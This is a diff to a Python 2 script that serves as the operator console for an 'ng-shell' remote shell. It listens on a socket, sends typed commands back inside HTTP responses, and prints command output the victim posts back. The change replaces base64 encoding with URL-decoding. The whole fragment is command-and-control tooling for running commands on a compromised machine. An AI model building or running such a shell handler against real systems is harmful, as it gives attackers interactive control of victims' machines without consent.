@@ -1,4 +1,4 @@
-import socket, sys, base64, os, time
+import socket, sys, os, time, urllib
 from colorama import Fore, Back, Style
 from threading import Thread
 import urllib
@@ -18,28 +18,22 @@ print Fore.BLUE+'\n[+] Waiting for connection...\n'
 
 
 so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 so.bind(('127.0.0.1',  int(sys.argv[1])))
 so.listen(1)
-
-def base64_decode(text):
-	x = len(text)
-	if x % 4 != 0:
-		return base64.b64decode(text+'='*(4-(x%4)))
-	else:
-		return base64.b64decode(text)
 
 def handle(msg, sock):
 	global so
 	if 'POST' in msg:
 		try:
-			print base64_decode(msg.split('SPLITHERE')[1][1:].split('%')[0][:-1])
+			print Fore.GREEN + urllib.unquote(msg.split('SPLITHERE')[1][1:]).decode('utf8').replace('\\n', '\n').replace('+', ' ')[2:-1]#.split('%')[0][:-1]
 		except:
 			print 'Output Error'
 		finally:
 			sock.close()
 	else:
 		try:
-			sock.sendall(http_response+base64.b64encode(raw_input(Fore.GREEN+'[ng-shell] ~> ')))
+			sock.sendall(http_response+raw_input(Fore.RED+'[ng-shell] ~> '))
 			sock.close()
 		except Exception as x:
 			so.close()
